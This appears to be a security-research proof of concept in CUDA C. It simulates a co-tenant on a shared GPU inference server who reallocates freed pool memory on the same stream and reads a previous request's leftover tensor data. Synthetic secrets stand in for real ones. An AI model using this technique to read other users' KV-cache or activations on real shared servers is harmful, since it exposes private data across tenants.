/*
 * Experiment 6: Persistent GPU Pool Scanner
 *
 * Simulates a malicious co-tenant on a shared GPU inference server.
 * In each round:
 *   1. "Victim" allocates GPU memory, writes sensitive data, frees it
 *   2. "Attacker" immediately allocates from the same pool
 *   3. Attacker reads whatever is in the buffer — all victim data visible
 *
 * Key: victim and attacker use the SAME CUDA stream (simulating vLLM/TGI
 * where all requests run sequentially on the default stream).
 *
 * Demonstrates real GPU rental risk: on a shared inference server where
 * users' requests run sequentially on the same stream, each request can
 * read the previous request's full tensor contents from the pool.
 */

#include <cuda_runtime.h>
#include <stdio.h>
#include <math.h>

#define CHECK(call)                                                      \
    do {                                                                 \
        cudaError_t err = (call);                                        \
        if (err != cudaSuccess) {                                        \
            fprintf(stderr, "CUDA error %s:%d: %s\n",                   \
                    __FILE__, __LINE__, cudaGetErrorString(err));        \
            exit(1);                                                     \
        }                                                                \
    } while (0)

__global__ void write_victim_data(float *buf, int n, float secret) {
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    if (i < n)
        buf[i] = secret * (i + 1);
}

int main() {
    const int   ROUNDS  = 10;
    const int   N       = 8192;    /* 32 KB per round */
    const float SECRETS[] = {
        2.71828f, 1.41421f, 1.61803f, 0.57721f,
        3.14159f, 2.30259f, 1.73205f, 0.36788f,
        4.66920f, 6.02214f
    };

    cudaStream_t stream;
    CHECK(cudaStreamCreate(&stream));

    float *d_victim   = NULL;
    float *d_attacker = NULL;
    float  h_result[N];

    printf("=== Persistent GPU Pool Scanner ===\n");
    printf("    Simulates sequential requests on a shared inference server\n");
    printf("    Both victim and attacker use the SAME CUDA stream\n");
    printf("    Buffer size per round: %d floats (%d KB)\n\n",
           N, N * 4 / 1024);

    printf("%-6s  %-14s  %-10s  %-12s  %-10s\n",
           "Round", "Secret used", "Ptr-reuse", "Non-zero", "Pattern%");
    printf("------  --------------  ----------  ------------  ----------\n");

    int total_nonzero = 0;
    int total_elements = 0;

    for (int r = 0; r < ROUNDS; r++) {
        float secret = SECRETS[r % 10];

        /* VICTIM: allocate, fill, free */
        CHECK(cudaMallocAsync(&d_victim, N * sizeof(float), stream));
        write_victim_data<<<(N+255)/256, 256, 0, stream>>>(d_victim, N, secret);
        CHECK(cudaFreeAsync(d_victim, stream));
        /* Synchronize so pool has the block before attacker allocates */
        CHECK(cudaStreamSynchronize(stream));

        /* ATTACKER: allocate immediately — gets victim's block */
        CHECK(cudaMallocAsync(&d_attacker, N * sizeof(float), stream));
        CHECK(cudaStreamSynchronize(stream));

        /* Copy raw contents to host */
        CHECK(cudaMemcpy(h_result, d_attacker, N * sizeof(float),
                         cudaMemcpyDeviceToHost));

        /* Analysis */
        int nonzero   = 0;
        int matches   = 0;
        float first4[4] = {0};
        for (int i = 0; i < N; i++) {
            if (fabsf(h_result[i]) > 1e-6f) nonzero++;
            if (fabsf(h_result[i] - secret * (i + 1)) < 1e-2f) matches++;
        }
        for (int i = 0; i < 4; i++) first4[i] = h_result[i];

        total_nonzero  += nonzero;
        total_elements += N;

        printf("%-6d  %-14.5f  %-10s  %-5d/%-6d  %-6.1f%%\n",
               r + 1, secret,
               d_victim == d_attacker ? "YES" : "no",
               nonzero, N,
               100.0f * matches / N);

        if (r == 0) {
            printf("       First 4 leaked values : %.4f %.4f %.4f %.4f\n",
                   first4[0], first4[1], first4[2], first4[3]);
            printf("       Expected (%.5f*i)  : %.4f %.4f %.4f %.4f\n",
                   secret,
                   secret*1, secret*2, secret*3, secret*4);
        }

        /* Attacker frees — it becomes the victim block for next round */
        CHECK(cudaFreeAsync(d_attacker, stream));
        CHECK(cudaStreamSynchronize(stream));
    }

    printf("\n=== Summary ===\n");
    printf("  Total elements scanned : %d\n", total_elements);
    printf("  Total non-zero found   : %d (%.1f%%)\n",
           total_nonzero, 100.0f * total_nonzero / total_elements);

    if (total_nonzero > total_elements / 2) {
        printf("\n[!] HIGH EXPOSURE confirmed.\n");
        printf("    In a shared inference server (sequential requests,\n");
        printf("    same CUDA stream), every allocation exposes the\n");
        printf("    previous request's full tensor data.\n");
        printf("    An attacker with torch.empty can read KV-cache,\n");
        printf("    activations, and token embeddings from other users.\n");
    } else {
        printf("\n[=] Low exposure — check if same stream was used.\n");
    }

    CHECK(cudaStreamDestroy(stream));
    return 0;
}
